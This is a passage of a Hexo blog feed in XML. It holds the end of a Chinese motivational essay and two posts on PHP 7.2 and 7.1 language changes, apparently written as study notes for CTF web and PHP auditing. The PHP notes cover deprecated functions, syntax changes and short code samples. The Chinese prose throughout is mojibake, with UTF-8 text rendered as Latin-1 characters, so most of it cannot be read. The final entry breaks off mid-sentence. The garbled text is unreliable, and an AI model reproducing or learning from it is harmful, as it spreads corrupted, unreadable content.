åé¡¾çš„ä¸ºä»–å®Œæˆï¼Œå“ªæ€•æ˜¯ä»¥æˆ‘ä»¬çš„ç”Ÿå‘½ä¸ºä»£ä»·ï¼Œä¹Ÿåœ¨æ‰€ä¸è¾ï¼å› ä¸ºè¿™ä»½é‚€çº¦çš„å°½å¤´ç»ˆæœ‰ä¸€ä½åŒåƒšä¼šå°†é‚£é‡Œçš„å‹è¿«è§£æ”¾ï¼Œä½¿æ°¸å¤œè¿æ¥é»æ˜ï¼Œæ˜¯æ—¶å€™è®©å…¨ä¸–ç•Œçš„æ‡¦å¤«ï¼Œè›€è™«ï¼Œå‹è¿«è€…æƒ³èµ·å…±äº§ä¸»ä¹‰çš„åå­—äº†ï¼</p><p>â€œé‚£æ˜¯ä¼ å¥‡é™¨è½ä¹‹åœ°ï¼Œä½ æ‡‚ä¸æ‡‚ä»€ä¹ˆæ˜¯ä¼ å¥‡å•Šï¼Ÿä½ å»é™¤äº†é€æ­»è¿˜èƒ½åšä»€ä¹ˆï¼â€â€œé‚£é‡Œçš„è·¯è¿˜éœ€è¦æ¸¸ä¾ å»èµ°å®Œâ€¦â€¦ä¸€ç¾¤ç†æƒ³ä¸»ä¹‰è€…ï¼Œä¸ºå¯¹æŠ—å‹è¿«ä¸å‰¥å‰Šè€Œå­˜åœ¨ï¼Œä¸ºäººç±»è¿½å¯»çœŸæ­£çš„è‡ªç”±ä¸å¹³ç­‰â€â€œé‚£æ˜¯ä½ èƒ½æºåˆçš„äº‹å—ï¼Ÿä½ é™¤äº†å‡‘äººå¤´å½“ç‚®ç°è¿˜æœ‰å•¥ç”¨ï¼Ÿï¼ä½ æ­»äº†ï¼Œé‚£äº›åœ¨ä¹ä½ çš„äººã€ä½ æ‰€åœ¨ä¹çš„äººï¼Œæ€ä¹ˆåŠâ€â€œâ€¦â€¦ï¼ˆæ²‰é»˜ï¼‰ï¼Œæˆ‘æ˜¯å·¡æµ·æ¸¸ä¾ ï¼Œæˆ‘ä»¬éƒ½æ˜¯å·¡æµ·æ¸¸ä¾ ï¼Œå¸Œæœ›æˆ‘ä»¬è¿˜ä¼šå†è§ã€‚â€</p><p>è¿™äº›â€œå·¡æµ·â€æ¸¸ä¾ éƒ½æ˜¯èƒ½åœ¨æ˜Ÿçƒé—´ç©¿æ¢­çš„çŒ›äººï¼Œä¸è¦åªçœ‹äººå®¶å¼ºï¼Œå¤šæƒ³æƒ³äººå®¶ä¸ºä»€ä¹ˆå¼ºã€‚ç„¶åï¼Œè¯¥æˆ’æ‰‹å†²æˆ’æ‰‹å†²ã€è¯¥å­¦ä¹ å­¦ä¹ ã€è‡ªå·±æ‰¾æ–¹æ³•å˜å¼ºï¼Œæ‰æ˜¯çœŸæ­£çš„å·¡çŒå‘½é€”ã€‚</p><p>åœ¨æ¥ä¸‹æ¥çš„é•¿å¤œé‡Œï¼Œä½ ææ€•ä¼šé­é‡è®¸å¤šæŒ«æŠ˜ï¼Œè§è¯ä¼—å¤šæ‚²å‰§ï¼Œæœ€åï¼Œç›®ä¸­æ‰€è§åªä½™é»‘ç™½äºŒè‰²ã€‚<br>ä½†è¯·ç›¸ä¿¡ï¼Œåœ¨é‚£é»‘ç™½çš„ä¸–ç•Œä¸­ä¼šæœ‰ä¸€ç‚¹çº¢è‰²ç¨çºµå³é€ï¼Œä½†åœ¨ä½ åšå‡ºæŠ‰æ‹©ä¹‹æ—¶â€”â€”å®ƒå¿…å°†å†åº¦ç¤ºç°ã€‚<br>è€Œä½ ï¼Œè¦ä»”ç»†å’€åš¼å…¶æ„ä¹‰ï¼Œç„¶åå›åˆ°æ¸…é†’çš„ä¸–ç•Œå»ã€‚æˆ‘ä»¬éƒ½å°†åœ¨é‚£é‡Œæ‰¾åˆ°ç­”æ¡ˆã€‚</p><p>![](F:\new myblog\STUDY\source\img\1684809194900.jpg)</p><p>å¸å¼“ä»…ä»¥å…‰çŸ¢å®£å…¶çº¶éŸ³ å¸å…‰è¶…è½¦æ‰€å‘æ·  è‹¥ä»–ä¸å›å¤´ï¼Œé‚£ç¥‚çš„åˆ€å¿…ç£¨å¿«ï¼Œå¼“å¿…ä¸Šå¼¦ï¼Œä½¿æ¶äººæ–½åŠ çš„æ¯’å®³ä¸´åˆ°è‡ªå·±å¤´ä¸Šã€‚</p>]]></content>
    
    
    <categories>
      
      <category>é©å‘½æ‹‚æ™“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡å­—æ„Ÿæ‚Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP7.2ç‰¹æ€§</title>
    <link href="/2024/08/31/PHP7-2%E7%89%B9%E6%80%A7/"/>
    <url>/2024/08/31/PHP7-2%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP7-2å‡½æ•°ç›¸å…³å˜æ›´"><a href="#PHP7-2å‡½æ•°ç›¸å…³å˜æ›´" class="headerlink" title="PHP7.2å‡½æ•°ç›¸å…³å˜æ›´"></a>PHP7.2å‡½æ•°ç›¸å…³å˜æ›´</h1><h2 id="ï¼ˆåºŸå¼ƒï¼‰-autoload-æ–¹æ³•"><a href="#ï¼ˆåºŸå¼ƒï¼‰-autoload-æ–¹æ³•" class="headerlink" title="ï¼ˆåºŸå¼ƒï¼‰__autoload() æ–¹æ³•"></a>ï¼ˆåºŸå¼ƒï¼‰__autoload() æ–¹æ³•</h2><p><code>__autoload()</code> æ–¹æ³•å·²è¢«åºŸå¼ƒï¼Œ å› ä¸ºå’Œ <code>spl_autoload_register()</code> ç›¸æ¯”åŠŸèƒ½è¾ƒå·® (å› ä¸ºæ— æ³•é“¾å¼å¤„ç†å¤šä¸ª autoloader)ï¼Œ è€Œä¸”ä¹Ÿæ— æ³•åœ¨ä¸¤ç§ autoloading æ ·å¼ä¸­é…åˆä½¿ç”¨ã€‚</p><h2 id="ï¼ˆåºŸå¼ƒï¼‰create-function-å‡½æ•°"><a href="#ï¼ˆåºŸå¼ƒï¼‰create-function-å‡½æ•°" class="headerlink" title="ï¼ˆåºŸå¼ƒï¼‰create_function() å‡½æ•°"></a>ï¼ˆåºŸå¼ƒï¼‰create_function() å‡½æ•°</h2><p>è€ƒè™‘åˆ°æ­¤å‡½æ•°çš„å®‰å…¨éšæ‚£é—®é¢˜ï¼ˆå®ƒæ˜¯ <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a> çš„ç˜¦åŒ…è£…å™¨ï¼‰ï¼Œè¯¥è¿‡æ—¶çš„å‡½æ•°ç°åœ¨å·²è¢«åºŸå¼ƒã€‚ æ›´å¥½çš„é€‰æ‹©æ˜¯<a href="https://www.php.net/manual/zh/functions.anonymous.php">åŒ¿åå‡½æ•°</a>ã€‚</p><h2 id="ï¼ˆåºŸå¼ƒï¼‰parse-str-ä¸åŠ ç¬¬äºŒä¸ªå‚æ•°"><a href="#ï¼ˆåºŸå¼ƒï¼‰parse-str-ä¸åŠ ç¬¬äºŒä¸ªå‚æ•°" class="headerlink" title="ï¼ˆåºŸå¼ƒï¼‰parse_str() ä¸åŠ ç¬¬äºŒä¸ªå‚æ•°"></a>ï¼ˆåºŸå¼ƒï¼‰parse_str() ä¸åŠ ç¬¬äºŒä¸ªå‚æ•°</h2><p>ä½¿ç”¨ <code>parse_str()</code> æ—¶ï¼Œä¸åŠ ç¬¬äºŒä¸ªå‚æ•°ä¼šå¯¼è‡´æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°å¯¼å…¥å½“å‰ç¬¦å·è¡¨ã€‚ è€ƒè™‘åˆ°å®‰å…¨éšæ‚£é—®é¢˜ï¼Œä¸åŠ ç¬¬äºŒä¸ªå‚æ•°ä½¿ç”¨ <code>parse_str()</code> çš„è¡Œä¸ºå·²è¢«åºŸå¼ƒã€‚ æ­¤å‡½æ•°çš„ç¬¬äºŒä¸ªé€‰é¡¹ä¸ºå¿…å¡«é¡¹ï¼Œå®ƒä½¿æŸ¥è¯¢å­—ç¬¦ä¸²è½¬ä¸º Arrayã€‚</p><h2 id="ï¼ˆåºŸå¼ƒï¼‰assert-ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°"><a href="#ï¼ˆåºŸå¼ƒï¼‰assert-ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°" class="headerlink" title="ï¼ˆåºŸå¼ƒï¼‰assert() ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°"></a>ï¼ˆåºŸå¼ƒï¼‰assert() ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°</h2><p><code>assert()</code> å­—ç¬¦ä¸²å‚æ•°å°†è¦æ±‚å®ƒèƒ½è¢« <code>eval()</code> æ‰§è¡Œã€‚ è€ƒè™‘åˆ°å¯èƒ½è¢«æ‰§è¡Œè¿œç¨‹ä»£ç ï¼ŒåºŸå¼ƒäº†å­—ç¬¦ä¸²çš„ <a href="https://www.php.net/manual/zh/function.assert.php">assert()</a>ï¼Œæœ€å¥½æä¾› bool çš„è¡¨è¾¾å¼ã€‚</p><h2 id="ï¼ˆç§»é™¤ï¼‰-utf8-encode-å’Œ-utf8-decode-Â¶"><a href="#ï¼ˆç§»é™¤ï¼‰-utf8-encode-å’Œ-utf8-decode-Â¶" class="headerlink" title="ï¼ˆç§»é™¤ï¼‰ utf8_encode() å’Œ utf8_decode() Â¶"></a>ï¼ˆç§»é™¤ï¼‰ <a href="https://www.php.net/manual/zh/function.utf8-encode.php">utf8_encode()</a> å’Œ <a href="https://www.php.net/manual/zh/function.utf8-decode.php">utf8_decode()</a><a href="https://www.php.net/manual/zh/migration72.other-changes.php#migration72.other-changes.utf8_-functions-to-ext-standard"> Â¶</a></h2><p><a href="https://www.php.net/manual/zh/function.utf8-encode.php">utf8_encode()</a> å’Œ <a href="https://www.php.net/manual/zh/function.utf8-decode.php">utf8_decode()</a> ç°åœ¨å·²ç»ä½œä¸ºå­—ç¬¦ä¸²å¤„ç†å‡½æ•°ç§»åˆ°æ ‡å‡†æ‰©å±•ä¸­ï¼Œ åœ¨æ­¤ä¹‹å‰éœ€è¦å¯ç”¨ <a href="https://www.php.net/manual/zh/book.xml.php">XML</a> æ‰©å±•æ‰èƒ½ä½¿ç”¨ã€‚</p><h1 id="PHP7-2è¯­æ³•ç›¸å…³å˜æ›´"><a href="#PHP7-2è¯­æ³•ç›¸å…³å˜æ›´" class="headerlink" title="PHP7.2è¯­æ³•ç›¸å…³å˜æ›´"></a>PHP7.2è¯­æ³•ç›¸å…³å˜æ›´</h1><h2 id="ï¼ˆå¢åŠ ï¼‰å…è®¸é‡å†™æŠ½è±¡æ–¹æ³•"><a href="#ï¼ˆå¢åŠ ï¼‰å…è®¸é‡å†™æŠ½è±¡æ–¹æ³•" class="headerlink" title="ï¼ˆå¢åŠ ï¼‰å…è®¸é‡å†™æŠ½è±¡æ–¹æ³•"></a>ï¼ˆå¢åŠ ï¼‰å…è®¸é‡å†™æŠ½è±¡æ–¹æ³•</h2><p>å½“ä¸€ä¸ªæŠ½è±¡ç±»ç»§æ‰¿äºå¦å¤–ä¸€ä¸ªæŠ½è±¡ç±»çš„æ—¶å€™ï¼Œç»§æ‰¿åçš„æŠ½è±¡ç±»å¯ä»¥é‡å†™è¢«ç»§æ‰¿çš„æŠ½è±¡ç±»çš„æŠ½è±¡æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$s</span></span>)</span>;<br>&#125;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// overridden - still maintaining contravariance for parameters and covariance for return</span><br>    <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) : <span class="hljs-title">int</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ï¼ˆå¢åŠ ï¼‰å…è®¸åˆ†ç»„å‘½åç©ºé—´çš„å°¾éƒ¨é€—å·"><a href="#ï¼ˆå¢åŠ ï¼‰å…è®¸åˆ†ç»„å‘½åç©ºé—´çš„å°¾éƒ¨é€—å·" class="headerlink" title="ï¼ˆå¢åŠ ï¼‰å…è®¸åˆ†ç»„å‘½åç©ºé—´çš„å°¾éƒ¨é€—å·"></a>ï¼ˆå¢åŠ ï¼‰å…è®¸åˆ†ç»„å‘½åç©ºé—´çš„å°¾éƒ¨é€—å·</h2><p>å‘½åç©ºé—´å¯ä»¥åœ¨PHP 7ä¸­ä½¿ç”¨å°¾éšé€—å·è¿›è¡Œåˆ†ç»„å¼•å…¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Foo</span>\<span class="hljs-title">Bar</span>\&#123;<br>    <span class="hljs-title">Foo</span>,<br>    <span class="hljs-title">Bar</span>,<br>    <span class="hljs-title">Baz</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="ï¼ˆå¢åŠ ï¼‰è½¬åŒ–æ•°å­—é”®"><a href="#ï¼ˆå¢åŠ ï¼‰è½¬åŒ–æ•°å­—é”®" class="headerlink" title="ï¼ˆå¢åŠ ï¼‰è½¬åŒ–æ•°å­—é”®"></a>ï¼ˆå¢åŠ ï¼‰è½¬åŒ–æ•°å­—é”®</h2><p>è½¬åŒ–æ•°ç»„ä¸ºå¯¹è±¡ç±»å‹æ—¶ï¼Œå¦‚æœæ•°ç»„å­˜åœ¨æ•°å­—é”®ï¼Œç°åœ¨å¯ä»¥è®¿é—®äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// array to object</span><br><span class="hljs-variable">$arr</span> = [<span class="hljs-number">0</span> =&gt; <span class="hljs-number">1</span>];<br><span class="hljs-variable">$obj</span> = (<span class="hljs-keyword">object</span>)<span class="hljs-variable">$arr</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<br>    <span class="hljs-variable">$obj</span>,<br>    <span class="hljs-variable">$obj</span>-&gt;&#123;<span class="hljs-string">&#x27;0&#x27;</span>&#125;, // now accessible<br>    <span class="hljs-variable">$obj</span>-&gt;&#123;<span class="hljs-number">0</span>&#125; // now accessible<br>);<br><br><span class="hljs-comment"># ç»“æœ</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">PHP&lt;7.2</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [0]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">NULL</span><br><span class="hljs-comment">NULL</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PHP7.2</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [&quot;0&quot;]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">int(1)</span><br><span class="hljs-comment">int(1)</span><br></code></pre></td></tr></table></figure><p>å¯¹è±¡è½¬ä¸ºæ•°ç»„ä¹ŸåŒæ ·å¯ä»¥äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// object to array</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-number">0</span>&#125; = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br><span class="hljs-variable">$arr</span> = (<span class="hljs-keyword">array</span>)<span class="hljs-variable">$obj</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<br>    <span class="hljs-variable">$arr</span>,<br>    <span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>], // now accessible<br>    <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;0&#x27;</span>] // now accessible<br>);<br></code></pre></td></tr></table></figure><h2 id="ï¼ˆåºŸå¼ƒï¼‰ä¸å¸¦å¼•å·çš„å­—ç¬¦ä¸²"><a href="#ï¼ˆåºŸå¼ƒï¼‰ä¸å¸¦å¼•å·çš„å­—ç¬¦ä¸²" class="headerlink" title="ï¼ˆåºŸå¼ƒï¼‰ä¸å¸¦å¼•å·çš„å­—ç¬¦ä¸²"></a>ï¼ˆåºŸå¼ƒï¼‰ä¸å¸¦å¼•å·çš„å­—ç¬¦ä¸²</h2><p>ä¸å¸¦å¼•å·çš„å­—ç¬¦ä¸²æ˜¯ä¸å­˜åœ¨çš„å…¨å±€å¸¸é‡ï¼Œè½¬åŒ–æˆä»–ä»¬è‡ªèº«çš„å­—ç¬¦ä¸²ã€‚ åœ¨ä»¥å‰ï¼Œè¯¥è¡Œä¸ºä¼šäº§ç”Ÿ <strong>E_NOTICE</strong>ï¼Œä½†ç°åœ¨ä¼šäº§ç”Ÿ <strong>E_WARNING</strong>ã€‚åœ¨ä¸‹ä¸€ä¸ª PHP ä¸»ç‰ˆæœ¬ä¸­ï¼Œå°†æŠ›å‡º <strong>Error</strong> å¼‚å¸¸ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(NONEXISTENT);<br><br><span class="hljs-comment">/* Output:</span><br><span class="hljs-comment">Warning: Use of undefined constant NONEXISTENT - assumed &#x27;NONEXISTENT&#x27; (this will throw an Error in a future version of PHP) in %s on line %d</span><br><span class="hljs-comment">string(11) &quot;NONEXISTENT&quot;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h1 id="æ‚é¡¹"><a href="#æ‚é¡¹" class="headerlink" title="æ‚é¡¹"></a>æ‚é¡¹</h1><h2 id="æ–°çš„å¯¹è±¡ç±»å‹-Â¶"><a href="#æ–°çš„å¯¹è±¡ç±»å‹-Â¶" class="headerlink" title="æ–°çš„å¯¹è±¡ç±»å‹ Â¶"></a>æ–°çš„å¯¹è±¡ç±»å‹<a href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.object-type"> Â¶</a></h2><h2 id="é€šè¿‡åç§°åŠ è½½æ‰©å±•-Â¶"><a href="#é€šè¿‡åç§°åŠ è½½æ‰©å±•-Â¶" class="headerlink" title="é€šè¿‡åç§°åŠ è½½æ‰©å±• Â¶"></a>é€šè¿‡åç§°åŠ è½½æ‰©å±•<a href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.ext-loading-by-name"> Â¶</a></h2><h2 id="æ‰©å±•äº†å‚æ•°ç±»å‹-Â¶"><a href="#æ‰©å±•äº†å‚æ•°ç±»å‹-Â¶" class="headerlink" title="æ‰©å±•äº†å‚æ•°ç±»å‹ Â¶"></a>æ‰©å±•äº†å‚æ•°ç±»å‹<a href="https://www.php.net/manual/zh/migration72.new-features.php#migration72.new-features.param-type-widening"> Â¶</a></h2><h2 id="Disallow-passing-NULL-to-get-class-Â¶"><a href="#Disallow-passing-NULL-to-get-class-Â¶" class="headerlink" title="Disallow passing NULL to get_class() Â¶"></a>Disallow passing <strong>NULL</strong> to <a href="https://www.php.net/manual/zh/function.get-class.php">get_class()</a><a href="https://www.php.net/manual/zh/migration72.incompatible.php#migration72.incompatible.no-null-to-get_class"> Â¶</a></h2>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>phpå®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP7.1ç‰¹æ€§</title>
    <link href="/2024/08/31/PHP7-1%E7%89%B9%E6%80%A7/"/>
    <url>/2024/08/31/PHP7-1%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP7-1å‡½æ•°ç›¸å…³å˜æ›´"><a href="#PHP7-1å‡½æ•°ç›¸å…³å˜æ›´" class="headerlink" title="PHP7.1å‡½æ•°ç›¸å…³å˜æ›´"></a>PHP7.1å‡½æ•°ç›¸å…³å˜æ›´</h1><h2 id="list-ç°åœ¨æ”¯æŒé”®å"><a href="#list-ç°åœ¨æ”¯æŒé”®å" class="headerlink" title="list()ç°åœ¨æ”¯æŒé”®å"></a>list()ç°åœ¨æ”¯æŒé”®å</h2><p>ç°åœ¨<code>list()</code>å’Œå®ƒçš„æ–°çš„*[]*è¯­æ³•æ”¯æŒåœ¨å®ƒå†…éƒ¨å»æŒ‡å®šé”®åã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥å°†ä»»æ„ç±»å‹çš„æ•°ç»„ éƒ½èµ‹å€¼ç»™ä¸€äº›å˜é‡ï¼ˆä¸çŸ­æ•°ç»„è¯­æ³•ç±»ä¼¼ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<br>    [<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&#x27;Tom&#x27;</span>],<br>    [<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&#x27;Fred&#x27;</span>],<br>];<br><br><span class="hljs-comment">// list() style</span><br><span class="hljs-keyword">list</span>(<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id1</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name1</span>) = <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// [] style</span><br>[<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id1</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name1</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// list() style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">list</span>(<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name</span>)) &#123;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br><br><span class="hljs-comment">// [] style</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> [<span class="hljs-string">&quot;id&quot;</span> =&gt; <span class="hljs-variable">$id</span>, <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-variable">$name</span>]) &#123;<br>    <span class="hljs-comment">// logic here with $id and $name</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç¦æ­¢åŠ¨æ€è°ƒç”¨çš„å‡½æ•°"><a href="#ç¦æ­¢åŠ¨æ€è°ƒç”¨çš„å‡½æ•°" class="headerlink" title="ç¦æ­¢åŠ¨æ€è°ƒç”¨çš„å‡½æ•°"></a>ç¦æ­¢åŠ¨æ€è°ƒç”¨çš„å‡½æ•°</h2><p>å¦‚ä¸‹ï¼š</p><ul><li><a href="https://www.php.net/manual/zh/function.assert.php">assert()</a> - with a string as the first argument</li><li><a href="https://www.php.net/manual/zh/function.compact.php">compact()</a></li><li><a href="https://www.php.net/manual/zh/function.extract.php">extract()</a></li><li><a href="https://www.php.net/manual/zh/function.func-get-args.php">func_get_args()</a></li><li><a href="https://www.php.net/manual/zh/function.func-get-arg.php">func_get_arg()</a></li><li><a href="https://www.php.net/manual/zh/function.func-num-args.php">func_num_args()</a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-vars.php">get_defined_vars()</a></li><li><a href="https://www.php.net/manual/zh/function.mb-parse-str.php">mb_parse_str()</a> - with one arg</li><li><a href="https://www.php.net/manual/zh/function.parse-str.php">parse_str()</a> - with one arg</li></ul><p>å°¾éšçš„<code>-</code>ä»£è¡¨ç¦æ­¢åŠ¨æ€è°ƒç”¨çš„æ¡ä»¶ã€‚<code>func_get_args</code>ç­‰å‡ ä¸ªå‡½æ•°æµ‹è¯•äº†ä¸‹å¥½åƒå¹¶æ²¡æœ‰ç¦æ­¢åŠ¨æ€è°ƒç”¨ï¼Ÿä¸å¤ªæ‡‚ã€‚</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>å¯¹<code>allowed_classes</code>å‚æ•°ä¸¥æ ¼åŒ–ï¼Œå¦‚æœå¯¹å…¶ä¼ å…¥çš„å€¼æ˜¯<strong>å¸ƒå°”å€¼</strong>å’Œ<strong>æ•°ç»„</strong>ä¹‹å¤–çš„å†…å®¹ï¼Œ<code>unserialize</code>å°†è¿”å›<strong>False</strong>å’Œ<strong>E_WARNING</strong></p><h2 id="getenvå¯ä»¥ä¸éœ€è¦ä¼ å…¥å‚æ•°"><a href="#getenvå¯ä»¥ä¸éœ€è¦ä¼ å…¥å‚æ•°" class="headerlink" title="getenvå¯ä»¥ä¸éœ€è¦ä¼ å…¥å‚æ•°"></a>getenvå¯ä»¥ä¸éœ€è¦ä¼ å…¥å‚æ•°</h2><p><code>getenv()</code> å¯ä»¥ä¸ä¼ å…¥ä»»ä½•å‚æ•°ã€‚ å¦‚æœä¸ä¼ å…¥å‚æ•°ï¼Œæ­¤å‡½æ•°ä¼šä»¥å…³è”æ•°ç»„çš„å½¢å¼ è¿”å›æ‰€æœ‰çš„ç¯å¢ƒå˜é‡ã€‚</p><p><img src="C:\Users\a1348\Desktop\WebBook-master\WebBook-master\images\19-10-1_PHP_PHP71å‡½æ•°ç›¸å…³å˜æ›´_2.png"></p><h2 id="parse-urlæ”¯æŒRFC3986"><a href="#parse-urlæ”¯æŒRFC3986" class="headerlink" title="parse_urlæ”¯æŒRFC3986"></a>parse_urlæ”¯æŒRFC3986</h2><p><code>parse_url()</code> æ›´åŠ ä¸¥æ ¼çš„é™åˆ¶ï¼Œ å¹¶ä¸”æä¾›å¯¹ RFC3986 çš„æ”¯æŒã€‚</p><h2 id="session-startå°†è¿”å›false"><a href="#session-startå°†è¿”å›false" class="headerlink" title="session_startå°†è¿”å›false"></a>session_startå°†è¿”å›false</h2><p><code>session_start()</code> å½“æ— æ³•æˆåŠŸåˆå§‹åŒ–ä¼šè¯çš„æ—¶å€™ï¼Œè¿”å› <strong>FALSE</strong>ï¼Œ å¹¶ä¸”ä¸ä¼šåˆå§‹åŒ–è¶…çº§å˜é‡ 